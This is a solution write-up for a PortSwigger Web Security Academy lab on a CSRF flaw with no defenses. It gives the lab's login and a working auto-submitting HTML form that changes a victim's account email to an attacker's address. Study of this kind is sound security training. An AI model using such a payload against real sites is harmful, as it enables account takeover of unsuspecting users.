# Lab 01 — CSRF vulnerability with no defenses

> **Apprentice** · [Official lab](https://portswigger.net/web-security/csrf/lab-no-defenses)

**Entry point:** `POST /my-account/change-email` — no CSRF token at all.

## Solution

1. Log in (`wiener:peter`), change your email, and study the request:
   simple form POST, session cookie included automatically.
2. On the exploit server, host an auto-submitting form:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
      method="POST">
  <input type="hidden" name="email" value="attacker@evil-you.net">
</form>
<script>document.forms[0].submit();</script>
```

3. **Store**, test with "View exploit" on your own session, then
   **Deliver to victim** — their email changes — lab solved.

## Notes

The victim's browser attaches their session cookie automatically — that is
the whole CSRF problem. Don't use an email you already registered.
